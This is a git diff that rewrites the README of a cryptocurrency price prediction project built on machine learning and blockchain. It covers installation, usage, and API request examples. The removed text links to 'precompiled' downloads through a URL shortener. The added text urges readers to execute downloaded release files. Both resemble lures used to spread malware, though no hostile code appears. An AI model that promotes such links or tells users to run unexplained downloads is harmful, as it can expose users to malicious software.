@@ -1,218 +1,123 @@
-Crypto Price Prediction
-## Download precompiled - [Click here](https://cleanuri.com/m0zvNm)
+# Crypto Price Prediction 🚀
 
+![Crypto Price Prediction](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
 
-This project combines machine learning with blockchain to predict cryptocurrency prices based on historical data. Blockchain ensures the transparency and immutability of prediction data while AI models provide price predictions.
+Welcome to the **Crypto Price Prediction** repository! This project merges machine learning with blockchain technology to predict cryptocurrency prices using historical data. The integration of blockchain ensures transparency and immutability, which are crucial for the data used in AI training. Our AI models then leverage this data to provide accurate price predictions.
 
+## Table of Contents
 
-Table of Contents
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Technologies Used](#technologies-used)
+4. [Installation](#installation)
+5. [Usage](#usage)
+6. [Data Sources](#data-sources)
+7. [Contributing](#contributing)
+8. [License](#license)
+9. [Contact](#contact)
+10. [Releases](#releases)
 
+## Introduction
 
+Cryptocurrency trading is a rapidly growing market. With its volatility, predicting price movements can be a daunting task. This project aims to simplify that by using machine learning techniques to analyze historical price data. By doing so, we hope to provide insights that can help traders make informed decisions.
 
+## Features
 
-Project Description
+- **Machine Learning Models**: Utilizes various machine learning algorithms to predict prices.
+- **Blockchain Integration**: Ensures data integrity and transparency.
+- **User-Friendly Interface**: Designed for easy navigation and usage.
+- **Real-Time Predictions**: Offers up-to-date price forecasts.
+- **Historical Data Analysis**: Analyzes past price movements for better predictions.
 
+## Technologies Used
 
-Technologies Used
+- **Programming Languages**: JavaScript, Python
+- **Frameworks**: TensorFlow, Flask
+- **Blockchain Technology**: Ethereum, Solidity
+- **Data Visualization**: Matplotlib, Plotly
+- **APIs**: CoinGecko API for real-time data
 
+## Installation
 
-Installation
+To set up the project locally, follow these steps:
 
+1. **Clone the repository**:
+   ```bash
+   git clone https://github.com/HarshBirari/crypto-price-prediction.git
+   ```
 
-Usage
+2. **Navigate to the project directory**:
+   ```bash
+   cd crypto-price-prediction
+   ```
 
+3. **Install the required dependencies**:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-Frontend
+4. **Set up the blockchain environment** (if applicable):
+   - Ensure you have [Node.js](https://nodejs.org/) installed.
+   - Install Truffle:
+     ```bash
+     npm install -g truffle
+     ```
 
+5. **Compile the smart contracts**:
+   ```bash
+   truffle compile
+   ```
 
-Contributing
+6. **Deploy the smart contracts**:
+   ```bash
+   truffle migrate
+   ```
 
+## Usage
 
-License
+After installation, you can start the application by running the following command:
 
+```bash
+python app.py
+```
 
-Contact
+Open your browser and navigate to `http://localhost:5000` to access the application. From there, you can input historical data and view predicted prices.
 
+## Data Sources
 
+This project relies on various data sources for historical cryptocurrency prices. We primarily use the CoinGecko API for fetching real-time and historical data. 
 
+To explore the API, visit [CoinGecko API Documentation](https://coingecko.com/en/api).
 
-Project Description
+## Contributing
 
+We welcome contributions! If you would like to contribute, please follow these steps:
 
-The Crypto Price Prediction project leverages the power of machine learning and blockchain technology to provide accurate predictions of cryptocurrency prices. The project aims to use historical data to train AI models, ensuring data integrity and transparency through blockchain technology.
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes and commit them (`git commit -m 'Add some feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a Pull Request.
 
+Please ensure your code adheres to the existing style and includes tests where applicable.
 
-Technologies Used
+## License
 
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
+## Contact
 
+For any inquiries, feel free to reach out to me:
 
-JavaScript
+- **Email**: your-email@example.com
+- **Twitter**: [@yourtwitterhandle](https://twitter.com/yourtwitterhandle)
 
+## Releases
 
-Python
+To download the latest release, visit [here](https://github.com/HarshBirari/crypto-price-prediction/releases). Make sure to execute the downloaded files as per the instructions provided.
 
+For future updates, keep an eye on the [Releases](https://github.com/HarshBirari/crypto-price-prediction/releases) section.
 
-Solidity
+---
 
-
-CSS
-
-
-
-
-Access the application
-:
-Open your web browser and navigate to 
-example.com
-.
-
-
-
-
-
-
-Frontend
-
-
-It is a 
-Next.js
- project built on React and TailwindCSS.
-
-
-Getting Started
-
-
-First, run the development server:
-
-
-npm run dev
-
-#
- or
-
-yarn dev
-
-#
- or
-
-pnpm dev
-
-#
- or
-
-bun dev
-
-
-Open 
-example.com
- with your browser to see the result.
-
-
-You can start editing the code in src. The page auto-updates as you edit the file.
-
-
-To learn more, take a look at the following resources:
-
-
-React Documentation - learn about React
-TailwindCSS Documentation - learn about TailwindCSS
-Next.js Documentation - learn about Next.js features and API.
-Learn Next.js - an interactive Next.js tutorial.
-Contributing
-
-
-We welcome contributions to the project! To contribute, follow these steps:
-
-
-Fork the repository.
-Create a new branch (git checkout -b feature-branch).
-Make your changes.
-Commit your changes (git commit -m 'Add some feature').
-Push to the branch (git push origin feature-branch).
-Open a Pull Request.
-
-
-License
-This project is licensed under the MIT License. See the LICENSE file for details.
-
-
-Contact
-For any inquiries, please contact Abhishek Verma.
-
-
-Code
-Feel free to customize the sections further based on the specific details and requirements of your project.
-Email: 
-abhishek27.sv@gmail.com
-
-
-activate virtual environment: venv\Scripts\activate
-
-
-Request for Bitcoin (/predict/btc):
-powershell
-$uri = "
-example.com
-"
-$headers = @{
-"Content-Type" = "application/json"
-}
-$body = @'
-[
-{
-"lag_1": 27408.34,
-"lag_2": 27350.56,
-"lag_3": 27455.23,
-"lag_4": 27500.34,
-"lag_5": 27300.67
-}
-]
-'@
-
-
-$response = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $body
-$response.Content
-Request for Ethereum (/predict/eth):
-powershell
-$uri = "
-example.com
-"
-$headers = @{
-"Content-Type" = "application/json"
-}
-$body = @'
-[
-{
-"lag_1": 1855.97,
-"lag_2": 1849.56,
-"lag_3": 1860.23,
-"lag_4": 1850.34,
-"lag_5": 1830.67
-}
-]
-'@
-
-
-$response = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $body
-$response.Content
-
-
-blockchain commands :
-npx hardhat compile
-npx hardhat run scripts/deploy.js --network skale
-
-
-predict-lstm.py:
-python predict-lstm.py --coin ETH --days 30
-python predict-lstm.py --coin BTC --days 30
-
-
-EXAMPLE API REQUEST FOR LSTM-SERVER:
-POST /predict/btc
-Content-Type: application/json
-
-
-{
-"sequence": [0.234, 0.238, ..., 0.456]  // 60 normalized float values
-}
+Thank you for checking out the Crypto Price Prediction project! We hope it helps you navigate the exciting world of cryptocurrency trading.
